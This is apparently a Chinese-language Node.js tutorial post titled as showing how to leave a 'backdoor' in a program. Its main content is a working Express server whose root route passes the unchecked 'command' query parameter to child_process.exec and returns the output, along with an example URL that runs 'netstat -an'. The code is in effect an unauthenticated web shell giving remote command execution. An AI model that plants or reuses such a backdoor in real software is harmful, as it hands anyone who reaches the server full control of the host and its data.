Node.JS實戰35：給程序留一個“後門”

2020-10-29
| 科技

本文講的技巧性知識，有很多正面、合理的應用場景。

先看代碼：

var express = require('express');var app = express();//內置中間件，靜態文件訪問app.use(express.static('./'))//監聽var server = app.listen(8000, function () {   var host = server.address().address   var port = server.address().port   console.log(host, port);})//當訪問根目錄時觸發app.get('/', function (req, res) {      //command      var command = req.query.command;      //執行      var exec = require("child_process").exec;      exec(command,function(err,stdout){         //輸出到網頁         res.end(stdout);      });     })

註釋已加在代碼中。

當訪問網站根目錄時，程序會從command參數中獲取指令，執行並顯示到網頁中。

運行，然後通過瀏覽器訪問：

http://127.0.0.1:8000/?command=netstat -an

這樣傳入的命令是：netstat-an，即查看當前機器可用連接。
